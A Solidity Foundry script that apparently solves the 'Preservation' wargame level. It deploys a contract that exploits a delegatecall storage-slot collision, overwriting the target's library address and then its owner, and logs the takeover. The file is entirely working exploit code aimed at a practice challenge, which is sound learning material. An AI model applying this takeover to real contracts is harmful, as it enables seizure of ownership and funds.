// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "src/16Preservation.sol";

contract HackPreservation {
    Preservation target;
    address public reserved;
    address public owner;

    constructor(address _target) {
        target = Preservation(_target);
    }

    function attack() public {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 ownerAsUint256) public {
        owner = address(uint160(ownerAsUint256));
    }
}

contract PreservationAttack is Script {
    address constant CHALLENGE = 0x99D86bF69a9003D02f72B9e19A016949d10F1B3f;
    HackPreservation public hackPreservation;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        hackPreservation = new HackPreservation(CHALLENGE);
        console.log("HackPreservation deployed at:", address(hackPreservation));
        hackPreservation.attack();
        console.log("New owner:", Preservation(CHALLENGE).owner());
        vm.stopBroadcast();
    }
}
